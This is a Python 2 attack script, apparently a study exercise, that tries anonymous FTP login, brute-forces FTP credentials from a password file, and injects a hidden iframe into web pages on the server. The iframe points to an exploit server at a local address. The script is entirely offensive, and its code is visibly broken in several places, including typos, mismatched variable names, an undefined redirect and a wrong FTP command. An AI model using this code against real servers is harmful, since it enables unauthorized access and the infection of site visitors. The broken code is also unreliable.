# -*- coding:utf-8 -*-
#Pay my respects to k985ytv!!!
__author__ = 'dscdtc'

import time
import ftplib
import optparse

def anonLogin(hostname):#没什么卵用可以整合到bruteLogin()
    '''Try use Anonymous login FTP server.'''
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print '\n[*] %s FTP Anonymous Logon Succeed.' % hostname
        ftp.quit()
        return True
    except Exception, e:
        print '[-] FTP Anonymous Logon Failed.'
        return False

def bruteLogin(hostname, passwdFile):
    '''Try use dictionary login FTP server.'''
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print '[+] Trying: %s/%s' % (userName, passWord)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            # print '\n[*] FTP Logon Succeed: %s/%s' \
                # % (userName, passWord)
            ftp.quit()
            return (userName, passWord)
        except ftplib.error_perm:
            pass
    print '\n[-] Could not brute force FTP credentials.'
    return (None, None)
    
def returnDefault(ftp):
    '''Serch default page on FTP server.'''
    try:
        dirlist = ftp.nlst()
    except:
        dirList = []
        print '[-] Could not list directory contents.'
        print '[-] Skipping To Next Target.'
        return
    retList = []
    for filename in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn or '.jsp' in fn or '.html' in fn:
            print '[+] Found default page: ' + fileName
        retList.append(fileName)
        return retList
    
def injectPage(ftp, page, redirect):
    
    f = oprn(page + '.tmp', 'w')
    ftp.retrlines('PETR ' + page, f.write)
    print '[+] Downloaded Page: ' + page
    redirect = '<iframe src=' + \
        '"http://10.10.10.112:8080/exploit"></iframe>'
    f.write(redirect)
    f.close()
    print '[+] Injected Malicious IFrame on: ' + page
    
def attack(userName, password, tgtHost, redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defPages = returnDefault(ftp)
    for defPage in defPages:
        injectPage(ftp, page, redirect)
        
def main():
    '''ftpHack.py -H 192.168.95.179 -r '<iframe src="http://10.10.10.112:8080/exploit"></iframe>' -f userpass.txt'''
    #解析命令行参数
    #创建OptionParser对象；定义命令行参数;调用parse_args()解析命令行
    usage = "usage: %prog -H <target host[s]> " + \
            "-r <redirect page> -f <userpass file>"
    parser = optparse.OptionParser(usage, version="%prog 1.0")
    parser.add_option('-H', dest='tgtHosts', type='string', \
                    help='specify target host[s] separated by comma')
    # parser.add_option('-r', dest='redirect', type='string', \
                    # help='specify a redirection page')
    parser.add_option('-f', dest='passwdFile', type='string', \
                    help='[specify user/password file]')
    (options, args) = parser.parse_args()

    #按位或运算判断flags是否为空
    tgtHosts = str(options.tgtHosts).split(',')
    passwdFile = options.passwdFile
    #redirect = options.redirect
    #if redirect == None or tgtHosts == None:
    if tgtHosts == None:
        print parser.usage
        print parser.print_help()
        exit(0)

    for tgtHost in tgtHosts:
        username = None
        password = None
        if anonLogin(tgtHost) == True:
            username = 'anonymous'
            password = 'me@your.com'
            print '[+] Using Anonymous Creds to attack'
            attack(username, password, tgtHost, redirect)
        elif passwdFile != None:
            (user, password) = bruteLogin(tgtHost, passwdFile)
            if password != None:
                print '[+] Using Creds: %s/%s to attack'\
                        % (user/password)
                attack(username, password, tgtHost, redirect)
            else:
                print '[-] Brute login failed ...'

if __name__ == '__main__':
    main()